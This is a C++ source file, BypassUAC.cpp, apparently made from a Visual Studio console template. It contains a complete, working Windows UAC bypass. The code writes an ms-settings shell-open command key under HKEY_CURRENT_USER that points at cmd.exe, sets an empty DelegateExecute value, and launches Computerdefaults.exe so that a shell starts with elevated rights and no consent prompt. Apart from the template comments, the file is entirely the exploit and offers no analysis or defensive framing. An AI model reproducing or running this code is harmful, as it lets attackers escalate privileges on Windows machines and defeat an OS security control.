// BypassUAC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

using namespace std;



int main(void)
{
	HKEY hKey = NULL;
	HKEY hkResult = NULL;
	HKEY hkResult2 = NULL;
	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
	DWORD dwDisposition;
	const TCHAR * m_strPathKey =_T("Software\\Classes\\ms-settings\\Shell\\Open\\command");
	const wchar_t* payload = L"C:\\Windows\\System32\\cmd.exe";
	DWORD Len = wcslen(payload) * 2 + 2;

	LONG lRes = ::RegCreateKeyEx(HKEY_CURRENT_USER, m_strPathKey, 0, NULL, dwOptions, KEY_WRITE, NULL, &hKey, &dwDisposition);
	if ( lRes != ERROR_SUCCESS)
    {
		printf("[!]Create Fail %x\n", GetLastError());
		system("pause");
		return 0;
	}
	else
	{
		if (dwDisposition == REG_OPENED_EXISTING_KEY)
		{
			printf("[!] Exited\n");
			system("pause");
			return 0;
		}
		else if (dwDisposition == REG_CREATED_NEW_KEY)
		{
			printf("[+] Create New Key\n");
		}
	}
	RegCloseKey(hKey);

	int ret = RegOpenKey(HKEY_CURRENT_USER, m_strPathKey, &hkResult);
	
	ret = RegSetValueEx(hkResult, L"DelegateExecute", 0, REG_SZ, NULL,NULL);

	if (ret == 0) {
		printf("[+] Success to write run key\n");
		RegCloseKey(hkResult);
	}
	else
	{
		printf("[!] Failed to open regdit. %x\n", GetLastError());
		system("pause");
		return 0;
	}

	if (ERROR_SUCCESS == ::RegOpenKey(HKEY_CURRENT_USER, m_strPathKey, &hkResult2))
	{
		if (ERROR_SUCCESS == ::RegQueryValue(HKEY_CURRENT_USER, m_strPathKey, 0, NULL));
		{
			int ret = RegSetValueEx(hkResult2,NULL,0,REG_SZ, (BYTE*)payload,Len);
				if (ret == 0) {
					printf("[+] Write Key Success!\n");
					RegCloseKey(hkResult2);
				}
				else
				{
					printf("[!] Failed to Write Key %x\n", GetLastError());
					system("pause");
					return  0;
				}
		}
 
	}
		
	printf("Starting Computerdefaults.exe");
	system("C://Windows//System32//Computerdefaults.exe");
	
	

	

	return 0;

	
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
